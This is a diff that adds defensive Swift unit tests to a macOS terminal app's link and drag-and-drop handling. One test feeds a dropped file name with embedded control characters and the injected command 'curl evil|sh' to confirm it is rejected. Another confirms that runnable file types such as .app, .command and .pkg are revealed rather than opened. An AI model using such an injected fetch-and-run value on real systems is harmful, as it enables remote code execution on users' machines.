@@ -30,6 +30,36 @@ struct TerminalKeyTests {
 @MainActor
 @Suite("⌘-click 路径")
 struct LinkTests {
+    @Test("拖进来的文件名带控制字符（回车、Ctrl-U、Esc）不输入：会被终端当成按键执行")
+    func droppedPathsRejectControlCharacters() {
+        #expect(TerminalDrop.text(for: ["/tmp/a b/it's.txt", "/tmp/c"]) == "'/tmp/a b/it'\\''s.txt' /tmp/c ")
+        #expect(TerminalDrop.text(for: ["/tmp/a\u{15}curl evil|sh\r"]) == nil)
+        #expect(TerminalDrop.text(for: ["/tmp/ok", "/tmp/\u{1b}[31m"]) == nil)
+        #expect(TerminalDrop.text(for: ["/tmp/del\u{7f}"]) == nil)
+        #expect(TerminalDrop.text(for: ["/tmp/中文 名字.md"]) == "'/tmp/中文 名字.md' ")
+    }
+
+    @Test("会运行东西 / 会跳到别处的不打开，只在访达里显示")
+    func revealsRunnableThings() throws {
+        let dir = FileManager.default.temporaryDirectory.appendingPathComponent("sb-reveal-\(UUID())")
+        defer { try? FileManager.default.removeItem(at: dir) }
+        for sub in ["Helper.app/Contents", "Flow.workflow/Contents", "plain folder"] {
+            try FileManager.default.createDirectory(at: dir.appendingPathComponent(sub), withIntermediateDirectories: true)
+        }
+        for name in ["setup.terminal", "run.command", "site.webloc", "evil.inetloc", "x.fileloc", "install.pkg", "profile.mobileconfig",
+                     "a.scpt", "notes.md", "main.swift", "shot.png"] {
+            try "x".write(to: dir.appendingPathComponent(name), atomically: true, encoding: .utf8)
+        }
+        let reveal = { (name: String) in LinkOpener.revealsInsteadOfOpening(dir.appendingPathComponent(name).path) }
+        #expect(reveal("Helper.app"))
+        #expect(reveal("Flow.workflow"))
+        for name in ["setup.terminal", "run.command", "site.webloc", "evil.inetloc", "x.fileloc", "install.pkg", "profile.mobileconfig", "a.scpt"] {
+            #expect(reveal(name), "\(name)")
+        }
+        #expect(!reveal("plain folder"))
+        #expect(!reveal("notes.md") && !reveal("main.swift") && !reveal("shot.png"))
+    }
+
     @Test func resolve() throws {
         let dir = FileManager.default.temporaryDirectory.appendingPathComponent("sb-link-\(UUID())")
         try FileManager.default.createDirectory(at: dir.appendingPathComponent("Sources"), withIntermediateDirectories: true)
